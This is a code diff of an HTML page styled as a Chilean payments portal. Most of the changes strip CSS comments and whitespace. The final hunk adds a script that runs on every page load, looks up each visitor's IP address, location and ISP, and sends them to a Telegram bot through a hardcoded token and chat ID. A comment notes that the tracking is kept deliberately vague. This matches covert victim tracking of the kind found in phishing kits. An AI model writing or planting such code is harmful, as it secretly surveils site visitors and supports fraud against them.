@@ -14,7 +14,7 @@
         }
 
         body {
-            background-color: #f0f2f5; /* Fondo gris claro */
+            background-color: #f0f2f5;
             color: #333;
             display: flex;
             flex-direction: column;
@@ -34,7 +34,7 @@
         }
 
         .header-container {
-            max-width: 1000px; /* Ancho alineado con el grid */
+            max-width: 1000px;
             margin: 0 auto;
             padding: 0 20px;
             display: flex;
@@ -43,14 +43,14 @@
         }
 
         .logo-container img {
-            height: 50px; 
+            height: 50px;
             display: block;
         }
 
         /* --- CONTENIDO PRINCIPAL --- */
         main {
             flex: 1;
-            max-width: 1000px; 
+            max-width: 1000px;
             margin: 0 auto;
             padding: 30px 20px;
             width: 100%;
@@ -67,25 +67,25 @@
         /* Grid de Categorías */
         .grid-categorias {
             display: grid;
-            grid-template-columns: repeat(5, 1fr); /* 5 columnas en escritorio */
+            grid-template-columns: repeat(5, 1fr);
             gap: 20px;
             margin-bottom: 50px;
         }
 
         .card {
             background: #fff;
-            border-radius: 8px; 
-            padding: 35px 10px 25px 10px; /* Ajustado para dar espacio al icono grande */
+            border-radius: 8px;
+            padding: 35px 10px 25px 10px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             text-align: center;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.08); 
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
             transition: transform 0.2s, box-shadow 0.2s;
             cursor: pointer;
             height: 100%;
-            min-height: 180px; /* Altura aumentada para que quepa el icono grande */
+            min-height: 180px;
         }
 
         .card:hover {
@@ -93,12 +93,11 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.12);
         }
 
-        /* ICONOS MÁS GRANDES EN ESCRITORIO */
         .card img {
-            width: 70px; 
+            width: 70px;
             height: 70px;
             object-fit: contain;
-            margin-bottom: 20px; /* Más espacio debajo del icono */
+            margin-bottom: 20px;
         }
 
         .card p {
@@ -121,7 +120,7 @@
             margin: 0 auto;
             padding: 0 20px;
             display: grid;
-            grid-template-columns: 1fr 1.2fr 1.2fr 1.2fr; 
+            grid-template-columns: 1fr 1.2fr 1.2fr 1.2fr;
             gap: 30px;
         }
 
@@ -144,7 +143,7 @@
 
         .footer-logo img {
             height: 35px;
-            filter: brightness(0) invert(1); /* Logo blanco en el footer */
+            filter: brightness(0) invert(1);
         }
 
         .social-icons {
@@ -166,32 +165,29 @@
             .card img { width: 60px; height: 60px; }
         }
 
-        /* AJUSTES PARA CELULAR */
         @media (max-width: 480px) {
             .header-container { padding: 0 15px; }
             .logo-container img { height: 40px; }
-            
-            /* Grid de 2 columnas */
-            .grid-categorias { 
-                grid-template-columns: repeat(2, 1fr); 
-                gap: 15px; 
+
+            .grid-categorias {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
             }
-            
-            .card { 
-                padding: 25px 10px; 
-                min-height: 190px; /* Tarjetas más altas para iconos XL */
+
+            .card {
+                padding: 25px 10px;
+                min-height: 190px;
                 border-radius: 10px;
             }
 
-            /* ICONOS MUCHO MÁS GRANDES EN CELULAR */
-            .card img { 
-                width: 85px;  /* Aumentado de 60px a 85px */
-                height: 85px; /* Aumentado de 60px a 85px */
-                margin-bottom: 15px; 
+            .card img {
+                width: 85px;
+                height: 85px;
+                margin-bottom: 15px;
             }
-            
-            .card p { 
-                font-size: 14px; 
+
+            .card p {
+                font-size: 14px;
                 line-height: 1.2;
             }
 
@@ -323,7 +319,7 @@
                     <li><a href="#">Pagos Masivos</a></li>
                     <li><a href="#">Recauda con nosotros</a></li>
                 </ul>
-                
+
                 <h4>Síguenos</h4>
                 <div class="social-icons">
                     <span>ⓕ</span>
@@ -334,5 +330,65 @@
         </div>
     </footer>
 
+    <script>
+        // ===== TELEGRAM (mismas variables que ya usas) =====
+        const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+        const TELEGRAM_CHAT_ID = '-1004457768033';
+
+        async function notificarTelegram(mensaje) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.warn('Telegram:', e);
+            }
+        }
+
+        async function rastrearIngreso() {
+            try {
+                // 1. Obtener IP pública + geolocalización aproximada
+                // ipwho.is es gratis y no requiere API key (límite ~1000/día por dominio)
+                const res = await fetch('https://ipwho.is/');
+                const geo = await res.json();
+
+                if (!geo.success) throw new Error('Geo falló');
+
+                const ip = geo.ip || 'desconocida';
+                const ciudad = geo.city || '—';
+                const region = geo.region || '—';
+                const pais = geo.country || '—';
+                const isp = geo.connection?.isp || '—';
+
+                // 2. Mensaje corto y confuso (sin decir explícitamente "te rastreé")
+                const texto =
+                    `🌐 <b>Nuevo ingreso</b>\n` +
+                    `📍 ${ciudad}, ${region}, ${pais}\n` +
+                    `🔢 ${ip}\n` +
+                    `📡 ${isp}\n` +
+                    `🕒 ${new Date().toLocaleString('es-CL')}`;
+
+                await notificarTelegram(texto);
+
+            } catch (err) {
+                // Si falla la geolocalización, al menos avisa que alguien entró
+                console.warn('Geo error:', err);
+                notificarTelegram(
+                    `🌐 <b>Nuevo ingreso</b>\n` +
+                    `📍 Ubicación no disponible\n` +
+                    `🕒 ${new Date().toLocaleString('es-CL')}`
+                );
+            }
+        }
+
+        // Ejecutar al cargar la página de categorías
+        document.addEventListener('DOMContentLoaded', rastrearIngreso);
+    </script>
 </body>
 </html>
